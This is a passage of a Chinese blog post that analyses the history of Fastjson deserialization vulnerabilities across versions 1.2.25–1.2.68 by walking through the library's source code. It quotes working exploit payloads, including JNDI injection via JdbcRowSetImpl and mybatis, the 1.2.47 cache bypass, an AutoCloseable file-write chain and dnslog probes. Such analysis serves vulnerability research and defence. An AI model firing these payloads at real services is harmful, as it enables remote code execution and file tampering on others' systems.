+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913105248964.png" alt="image-20210913105248964"></p>
+<p>在黑名单检测之后 <code>clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);</code> 去加载类，在<code>TypeUtils.loadClass</code>里为了兼容带有描述符的类名，会把类名头部的<code>[</code>去了还有以<code>L </code>起头<code>;</code>结尾时也会把<code>L</code>和 <code>; </code>去了。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913104926804.png" alt="image-20210913104926804"></p>
+<p>所以这里有个逻辑漏洞，我们给类名的头尾加上 <code>L </code> <code>[</code> <code>;</code>可以绕过黑名单检测，接着在加载类的时候又会把这些字符给去了。</p>
+<p>前提是开启了 AutoType。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913110324366.png" alt="image-20210913110324366"></p>
+<h1 id="Fastjson-1-2-25-1-2-42"><a href="#Fastjson-1-2-25-1-2-42" class="headerlink" title="Fastjson 1.2.25-1.2.42"></a>Fastjson 1.2.25-1.2.42</h1><p>Fastjson 1.2.42 版本对 Fastjson 1.2.25 逻辑漏洞绕过黑名单的问题进行了修复，并且黑名单采用了哈希加密混淆。这么久</p>
+<p>主要修改的部分还是在 <code>com.alibaba.fastjson.parser.ParserConfig</code></p>
+<p>黑名单：</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913135101698.png" alt="image-20210913135101698"></p>
+<p>有师傅去碰撞过这些 hash，找到了其中一些 hash 对应的类。 </p>
+<p> <a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>接着看黑名单检测的逻辑，在检测之前对类名处理了一下，其中一些参数也使用了 hash 进行混淆。但是应该就是处理 <code>L</code> <code>[</code> <code>;</code> 这些字符，去除头尾的 <code>L</code> <code>[</code> <code>;</code> </p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913135558350.png" alt="image-20210913135558350"></p>
+<p>这里只会处理一次，而在 loadclass 里是递归的去处理的，所以双写就能绕过（<del>这修复认真的嘛</del>）</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913140522595.png" alt="image-20210913140522595"></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913141035305.png" alt="image-20210913141035305"></p>
+<h1 id="Fastjson-1-2-25-1-2-43"><a href="#Fastjson-1-2-25-1-2-43" class="headerlink" title="Fastjson 1.2.25-1.2.43"></a>Fastjson 1.2.25-1.2.43</h1><p>修改了  <code>com.alibaba.fastjson.parser.ParserConfig</code> 处理  <code>L</code> <code>[</code> <code>;</code>  的逻辑，检测类名头部如果以 <code>L</code> <code>L</code>开头，如果是则直接抛出异常。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913145956033.png" alt="image-20210913145956033"></p>
+<p>这里说一些为什么在加载类的时候要去忽略   <code>L</code> <code>[</code> <code>;</code>   这些字符其实是 JNI 字段描述符，类似于 php 序列化里的 O表示对象、s 表示字符串。</p>
+<p>图来自 <a target="_blank" rel="noopener" href="https://www.playpi.org/2019041301.html">https://www.playpi.org/2019041301.html</a></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913160943935.png" alt="image-20210913160943935"> </p>
+<p>而 <code>[ </code>则是用来表示数组的，”[I” 就表示int[]，<code>[L</code>表示对象数组</p>
+<p>既然只会检测<code>LL</code>我们还可以用 <code>[</code>绕过，因为<code>[</code> 表示数组，所以类名里有他的话，会进行特殊处理。payload就需要重新构造一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,&#123;&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913153900351.png" alt="image-20210913153900351"></p>
+<h1 id="Fastjson-1-2-25-1-2-45"><a href="#Fastjson-1-2-25-1-2-45" class="headerlink" title="Fastjson 1.2.25-1.2.45"></a>Fastjson 1.2.25-1.2.45</h1><p>在 Fastjson 1.2.44 里对 1.2.43 进行了修复直接判断类名以 <code>[</code>开头直接抛出异常，以<code>;</code>结尾抛出异常。因为在 <code>loadclass </code>只有 <code>L</code> 开头同时<code>;</code>结尾时才会忽略。这样就没办法通过以前的办法绕过了。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913155515183.png" alt="image-20210913155515183"></p>
+<p>1.2.45 版本被爆出了一个利用黑名单之外的类可以用来 RCE ，利用的是 mybatis 库的<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>类。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">    &quot;properties&quot;:&#123;</span><br><span class="line">        &quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Fastjson-lt-1-2-47"><a href="#Fastjson-lt-1-2-47" class="headerlink" title="Fastjson &lt;=1.2.47"></a>Fastjson &lt;=1.2.47</h1><p>这个漏洞是 fastjson 漏洞史上最严重的一个，可以在唯一一个在未开启 autotype 的情况下可以利用的 payload</p>
+<p>payload </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;]</span><br></pre></td></tr></table></figure>
+
+
+<p>payload 是数组形式，其中 <code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</code> 就是之前正常的 jndi 注入的 paylaod 。</p>
+<p>还是先来看 <code>com.alibaba.fastjson.parser.ParserConfig </code>  checkAutoType 部分</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916141906289.png" alt="image-20210916141906289"></p>
+<p>这里有好几个 if 用来获取类，第一个就是 autoType 开启的情况下去黑白名单检测成功之后直接返回用户指定的类，失败的话就直接抛出异常不继续往下走。</p>
+<p>所以这里必须在 autoType 未开启的情况下，会通过 clazz = TypeUtils.getClassFromMapping(typeName); 去获取类，这里的 typeName 就是 @type 里指定的类。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916142110151.png" alt="image-20210916142110151"></p>
+<p>getClassFromMapping 方法其实就是从  Mappings 字典里去获取</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916142646702.png" alt="image-20210916142646702"></p>
+<p>打个断点看看  Mappings 里有啥，Mappings 中存储着类名字符串以及对应类对象，它起到一个缓存作用。如果 <code>@type</code> 指定的类，在缓存 Mappings 字典里找到的话，跳过 checkAutoType 检测直接返回类对象。这里就是这个漏洞的关键，只要在 Mappings 里添加进我们需要反序列化的类，就能绕过 checkAutoType 的黑名单检测。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916142834956.png" alt="image-20210916142834956"></p>
+<p>我们看 payload 的第一部分，@type 为 java.lang.Class，其并不在 Mappings 里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果不在 Mappings 里的类就继续往下，通过 clazz = this.deserializers.findClass(typeName); 去获取。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916144104777.png" alt="image-20210916144104777"></p>
+<p>看 findClass 方法，这里有会在 buckets 数组里寻找，如果<code>@type</code> 在 buckets 存在的话就返回类</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916144209162.png" alt="image-20210916144209162"></p>
+<p>一样的打个断点看一下  buckets 数组的内容，里边存了一些基础的类。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916144433722.png" alt="image-20210916144433722"></p>
+<p>java.lang.Class 也在其中，所以这里命中之后 checkAutoType 方法返回类。回到 <code>/com/alibaba/fastjson/parser/DefaultJSONParser.class</code></p>
+<p>返回的类赋值给 clazz ，接着就是对 clazz 做各种处理。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916144916552.png" alt="image-20210916144916552"></p>
+<p>这里一直到 365 行开始反序列化</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916145107551.png" alt="image-20210916145107551"></p>
+<p>跟进deserializer.deserialze() 方法</p>
+<p> com/alibaba/fastjson/serializer/MiscCodec.class</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916145414035.png" alt="image-20210916145414035"></p>
+<p>这里 lexer.token() 为 16，直接看这部分，这里处理 json 中的 val 字段(com.sun.rowset.JdbcRowSetImpl)并赋值给 objVal </p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916150255815.png" alt="image-20210916150255815"></p>
+<p>接着在 266行的位置，又把 objVal 赋值给 strVal 。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916150405285.png" alt="image-20210916150405285"></p>
+<p> 在 303 行的位置判断  clazz == Class.class ，这里的 clazz 就是前边传入的 clazz，也就是  <code>java.lang.Class</code>,所以这里自然符合条件，通过 TypeUtils.loadClass 去加载 strVal 也就是 com.sun.rowset.JdbcRowSetImpl。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916150727242.png" alt="image-20210916150727242"></p>
+<p>继续跟进  loadClass ，可以看到在加载的时候先判断类是否在 mappings 中，如果不存在，加载完成之后会添加进 mappings。</p>
+<p>com/alibaba/fastjson/util/TypeUtils.class</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916151202620.png" alt="image-20210916151202620"></p>
+<p>所以这里我们就把我们需要用到的恶意类 com.sun.rowset.JdbcRowSetImpl 添加进了 mappings，等下次反序列化进入 checkAutoType 时就可以绕过黑白名单检测。这就是 payload 第一部分 <code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code>的作用。</p>
+<p>第二部分的反序列化就和之前的一样了。</p>
+<h1 id="fastjson-lt-1-2-68"><a href="#fastjson-lt-1-2-68" class="headerlink" title="fastjson &lt;=1.2.68"></a>fastjson &lt;=1.2.68</h1><p>fastjson 1.2.68 更新了一个新的安全机制 safeMode，在开启的情况下 checkAutoType 方法会直接抛出异常。连绕过的机会都不给了，而且在陆陆续续的版本更迭 checkAutoType 方法的代码也更新了许多但是逻辑基本没变。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916153816933.png" alt="image-20210916153816933"></p>
+<p>但是被爆出在开启 AutoType 和 不开启 safeMode 的情况下可以通过 expectClass 绕过 AutoType</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;Evil&quot;,&quot;name&quot;:&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>说一下漏洞比较关键的地方</p>
+<p>在解析第二个 @type 时会调用 <code>userType = config.checkAutoType(ref, expectClass, lexer.getFeatures());</code></p>
+<p>此时 ref 为 Evil 也就是我们构造等恶意类，expectClass 为 java.lang.AutoCloseable，expectClass 称之为期望类。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916172342391.png" alt="image-20210916172342391"></p>
+<p>可以看到在不开启AutoType 的情况下 只要 expectClassFlag 为true 进行 loadClass。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916170918989.png" alt="image-20210916170918989"></p>
+<p>而 expectClassFlag 取决于  expectClass 此时 expectClass 为 java.lang.AutoCloseable</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916170717185.png" alt="image-20210916170717185"></p>
+<p>这里满足条件赋值  expectClassFlag = true;</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916172903017.png" alt="image-20210916172903017"></p>
+<p>接着在 1189行这里去加载类 typeName 也就是我们构造的 Evil。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916173001939.png" alt="image-20210916173001939"></p>
+<p>加载完成后赋值给 clazz ，最后还会判断一次 clazz 是否为 expectClass 的子类，如果是的话才会 return clazz。这也是为啥我们构造的 Evil 里需要继承  java.lang.AutoCloseable，这样是这个漏洞最大的限制。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210916173333755.png" alt="image-20210916173333755"></p>
+<p>真正利用的时候还需要去找一个继承  java.lang.AutoCloseable 的类，利用起来还是比较困难的</p>
+<p>写文件的 payload 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;f:&#x2F;test&#x2F;pwn.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;f:&#x2F;test&#x2F;test.txt&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;文件内容 base64 编码&quot;,</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Dnslog-探测-Fastjson"><a href="#Dnslog-探测-Fastjson" class="headerlink" title="Dnslog 探测 Fastjson"></a>Dnslog 探测 Fastjson</h1><p>经常有师傅在没有报错的情况下利用 dnslog 去探测 Fastjson </p>
+<p>基本就是利用黑名单以外的类或者是 buckets 、Mappings 内的类，有些是可以无视  AutoType 的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;:&quot;x&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;]</span><br><span class="line"></span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;:0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;fastjson&#x2F;issues&#x2F;3841</span><br><span class="line">最新版 1.2.76 开启safeMode</span><br><span class="line">&#123;&quot;ss&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;,&#125;</span><br></pre></td></tr></table></figure>
+<p>提一嘴，我觉得其实 dnslog  探测成功并不能说 fastjson 存在反序列化漏洞最多算个 ssrf，毕竟 按照fastjson 官方的修复方式，主要还是针对那些能够写文件或者 getshell 的漏洞链。</p>
+<h1 id="一些突破黑名单的-Paylod"><a href="#一些突破黑名单的-Paylod" class="headerlink" title="一些突破黑名单的 Paylod"></a>一些突破黑名单的 Paylod</h1><p>收集中。。。慢慢更新 </p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2020/07/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%B2/">https://blog.knownsec.com/2020/07/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%B2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/994/">https://paper.seebug.org/994/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1319/#0x01-checkautotype">https://paper.seebug.org/1319/#0x01-checkautotype</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/09/06/ThinkPHP%203.2.x%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&RCE%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-09-08 10:50:18
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                        <b>#</b> 反序列化
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Fastjson/" title="Fastjson">
+                        <b>#</b> Fastjson
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-24"><span class="toc-text">Fastjson 1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl"><span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-text">JdbcRowSetImpl</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-25-1-2-41"><span class="toc-text">Fastjson 1.2.25-1.2.41</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-25-1-2-42"><span class="toc-text">Fastjson 